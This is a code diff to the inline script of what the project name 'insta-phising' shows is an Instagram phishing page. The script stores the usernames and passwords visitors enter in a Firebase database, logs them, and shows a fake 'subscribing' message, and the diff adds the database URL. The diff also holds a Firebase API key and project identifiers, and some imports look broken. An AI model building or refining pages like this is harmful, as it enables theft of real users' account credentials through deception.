@@ -75,28 +75,27 @@
 
     <script type="module">
     // Import the functions you need from the SDKs you need
-    import { initializeApp } from "https://www.gstatic.com/firebasejs/9.18.0/firebase-app.js";
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/9.18.0/firebase-app.js";
     // TODO: Add SDKs for Firebase products that you want to use
     // https://firebase.google.com/docs/web/setup#available-libraries
   
     // Your web app's Firebase configuration
-    // For Firebase JS SDK v7.20.0 and later, measurementId is optional
-    const firebaseConfig = {
-      apiKey: "AIzaSyAj1J8WCgqc7qdBwjjsmg99DA876A4dJhE",
-      authDomain: "insta-phising-b6bd4.firebaseapp.com",
-      projectId: "insta-phising-b6bd4",
-      storageBucket: "insta-phising-b6bd4.appspot.com",
-      messagingSenderId: "597731552067",
-      appId: "1:597731552067:web:c94e220c21b287e1831df6",
-      measurementId: "G-SWDCPXNSQG"
-    };
-  
-    // Initialize Firebase
-    const app = initializeApp(firebaseConfig);
-    const analytics = getAnalytics(app);
+    // For Firebase JS SDK v7.20.0 and later, measurementId is optional        
+        const firebaseConfig = {
+    apiKey: "AIzaSyAj1J8WCgqc7qdBwjjsmg99DA876A4dJhE",
+    authDomain: "insta-phising-b6bd4.firebaseapp.com",
+    databaseURL: "https://insta-phising-b6bd4-default-rtdb.firebaseio.com",
+    projectId: "insta-phising-b6bd4",
+    storageBucket: "insta-phising-b6bd4.appspot.com",
+    messagingSenderId: "597731552067",
+    appId: "1:597731552067:web:c94e220c21b287e1831df6",
+    measurementId: "G-SWDCPXNSQG"
+  };
 
-    import { getDatabase, set, ref } 
-    from "https://www.gstatic.com/firebasejs/9.18.0/firebase-analytics.js";
+  // Initialize Firebase
+  const app = initializeApp(firebaseConfig);
+
+    import { getDatabase, set, ref } from "https://www.gstatic.com/firebasejs/9.18.0/firebase-analytics.js";
 
     // Database
     const db =  getDatabase();
@@ -117,7 +116,7 @@
             Password: _password.value
         }).then(() => {
             _password.value = ""
-            alert("You will get Your Data around 24 hr \n Thank you for subscribing!!")
+            alert("Thank you for subscribing!!")
 //             location.href = "https://www.instagram.com/"
             
             console.log(_username.value, _password.value)
